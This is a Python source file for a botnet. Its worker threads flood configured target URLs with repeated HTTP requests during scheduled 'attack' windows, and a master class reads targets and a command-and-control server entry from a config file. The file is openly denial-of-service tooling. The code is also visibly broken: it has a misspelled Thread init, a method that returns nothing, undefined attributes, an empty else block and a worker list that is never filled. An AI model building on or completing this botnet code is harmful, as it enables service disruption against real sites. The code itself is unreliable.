"""
This is the script handling the worker of the botnet seen as a single thread. 
The botnet will be made of multiple agents, independent each other, each one
using thread-based parallelism according to the features of their own running machines 
to handle multiple connection to the specified url.

Created:    24 October 2016
Modified:   14 November 2016
"""

from threading import Thread
from datetime import datetime, date
from time import sleep as threadSleep

from allsafe.Request import Request

from allsafe.utils.config import validateConfigFile
from allsafe.utils.log import log


class AllSafeWorker(Thread):
    def __init__(self, wid, name, config):
        """
        This class extends the implementation of threading.Thread to handle a HTTP GET request.
        On init we set the thread identifier and we call the super class method.

        @param: wid, integer - the worker unique identifier 
        @param: name, alphanumeric string - the thread unique name
        @param: config, dictionary - the configuration parameter for this thread
        """
        # calling superclass init method
        Thread._init__(self)
        # setting up threading attribute
        self._wid     = wid
        self._name    = name
        # setting up connection parameters from dictionary
        # configuration - connection
        self._request = config['request_params']
        # configuration - periodicity and sessions
        try:
            self._period   = int(config['period'])
            self._maxcount = int(config['maxcount'])
            self._sessions = config['sessions']
        except ValueError:
            raise Exception("WORKER"+str(wid)+"- Invalid configuration for worker - period / maxcount / sessions not properly formatted")
        # configuration - action 
        self._action   = config['action_conditions']


    def getWorkerTarget(self):
        """
        This method prints out a human readable representation of this worker purpose
        """
        workerTarget  = self.getName()
        workerTarget += " - TARGET: "  + self._url
        workerTarget += " - AGENT: "   + self._agent

    
    def carryAttack(self):
        """ 
        This method can be used to verify if the attack can be carried according the action conditions
        presetted in the config file

        @return: boolean, if the attack can be carried or not
        """
        # retrieving current date and time - it uses UTC based comparison
        today  = date.today()
        utcnow = datetime.utcnow()

        # checking for day 
        if today.month in self._action['avoid_month']:
            return False
        if today.weekday() in self._action['avoid_week']:
            return False

        # check if there is any particolar attack time
        if self._action != "none":
            attackTime = map((lambda t: int(t)), self._action['attack_time'].split("-"))
            if min(attackTime) <= utcnow.hour <= max(attackTime):
                return True
            else:
                return False
        # or check for AM / PM 
        else:
            if self._action['AM'] and self._action['PM']:
                return True
            if self._action['AM']:
                return 0 < utcnow.hour <= 12
            if self._action['PM']:
                return 12 < utcnow.hour <= 24


    def run(self):
        """ 
        This method is the one executed by the worker thread when it is started by the master thread.
        It check if it is possible to carry the attack, then start performing requests, carrying it on
        according to the configuration file.
        """
        # check if the attack can be carried on
        greenlight = self.carryAttack()

        while self._sessions > 0:
            if greenlight:
                # performing the attack
                for i in range(0, self._maxcount):
                    # instantiate request class 
                    req = Request(self._request)
                    # running request object 
                    try:
                        req.perform()
                    except ValueError:
                        continue
                    # thread safe sleeping for the specified interval
                    threadSleep(self._period)

                # decreasing session counter
                self._sessions  -= 1
                if self._sessions == 0: 
                    break
                else:
                    #TODO performing check for config updates
            
            greenlight = self.carryAttack()



class AllSafeWorkerMaster():
    def __init__(self, config_file):
        """
        This class represents the botnet master as the thread who is in command to launch every 
        thread execution in order to fulfill botnet requiremets. It accepts a configuration file
        as main 

        @param: config_file, filename - path for the configuration file 
        """
        # parsing the configuration file to return a configuration dictionary
        self._configuration = validateConfigFile(config_file)
        if self._configuration == None:
            raise Exception("Configuration file is not properly formatted!")

        # configuring the master
        self._modified = long(self._configuration["last_modified"])
        self._agent    = self._configuration["user_agent_b"]
        self._remote   = self._configuration["cc_server"]
        self._log      = self._configuration["log_file"]

        # initializing workers array
        self._workers = []
        
    
    def initializeWorkers(self):
        """
        This method allow the botnet master to create every thread with correct parameters in order
        to correctly execute them.
        """
        
        # logging the initialization routine - start
        log(self._log, "------------------- <SETUP> -------------------")

        for i in range(0, len(self._configuration["targets"])):
            # iterating over the target list we initialize every worker
            worker = AllSafeWorker(i, "worker-" + str(i), self._configuration["targets"][i])
            # logging worker reference
            log(self._log, worker.getWorkerTarget())

        # logging the initialization routine - end
        log(self._log, "------------------- </SETUP> -------------------")


    def executeBotnet(self): 
        """
        This method handle the execution of the entire botnet, starting each worker one after one and
        handling the final join operation.
        """
        
        # iterating over workers to start them up
        for worker in self._workers:
            # logging the startup routine
            log(self._log, "starting up " + worker.getName() + " ...")
            worker.start()

        # iterating over worker to join them
        for worker_to_join in self._workers:
            worker_to_join.join()
        
        log(self._log, "... finally exiting bot master!")


if __name__ == "__main__":
    # dummy
    